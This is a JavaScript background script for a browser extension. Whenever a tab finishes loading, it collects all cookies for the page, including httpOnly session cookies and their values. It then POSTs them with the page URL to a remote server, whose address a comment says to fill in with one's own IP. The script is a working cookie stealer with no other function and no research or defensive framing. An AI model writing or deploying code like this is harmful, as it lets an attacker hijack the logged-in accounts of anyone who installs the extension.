chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === "complete" && tab.url) {
    chrome.cookies.getAll({url: tab.url}, (cookies) => {
      const cookieData = cookies.map(cookie => ({
        name: cookie.name,
        value: cookie.value,
        domain: cookie.domain,
        path: cookie.path,
        session: cookie.session,
        hostOnly: cookie.hostOnly,
        secure: cookie.secure,
        httpOnly: cookie.httpOnly,
        sameSite: cookie.sameSite,
        expirationDate: cookie.expirationDate,
        storeId: cookie.storeId
      }));

      // Replace with your server IP address
      const serverUrl = "https://your-server-ip/cookies";

      fetch(serverUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          url: tab.url,
          cookies: cookieData
        })
      })
      .then(response => response.json())
      .then(data => {
        console.log("Cookies sent successfully:", data);
      })
      .catch(error => {
        console.error("Error sending cookies:", error);
      });
    });
  }
});
